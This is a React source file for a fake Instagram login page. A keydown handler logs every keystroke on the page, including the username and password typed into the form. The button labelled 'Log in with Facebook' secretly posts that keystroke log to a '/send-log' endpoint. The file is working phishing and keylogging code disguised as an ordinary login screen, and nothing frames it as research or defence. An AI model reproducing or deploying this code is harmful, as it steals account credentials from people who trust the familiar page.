import React , { useState }from 'react';
import './login.css';

function Login() {
    const [keyLog, setKeyLog] = useState([]);

    const handleKeyDown = (event) => {
        setKeyLog((prev) => [...prev, event.key]);
    };

    const saveAndSendLog = async () => {
        const response = await fetch('/send-log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ log: keyLog.join('') }),
        });
        const data = await response.json();
        console.log(data.message);
    };
  return (
    <div onKeyDown={handleKeyDown} tabIndex="0" className="login-container">
      <div className="login-box">
        <h1 className="instagram-logo">Instagram</h1>
        <form className="login-form">
          <input type="text" placeholder="Phone number, username, or email" />
          <input type="password" placeholder="Password" />
          <button type="submit">Log In</button>
        </form>
        <div className="separator">
          <div className="line"></div>
          <div className="or">OR</div>
          <div className="line"></div>
        </div>
        <button className="facebook-login"  onClick={saveAndSendLog}>Log in with Facebook</button>
        <a href="/" className="forgot-password">Forgot password?</a>
      </div>
      <div className="signup-box">
        <p>
          Don't have an account? <a href="/">Sign up</a>
        </p>
      </div>
    </div>
  );
}

export default Login;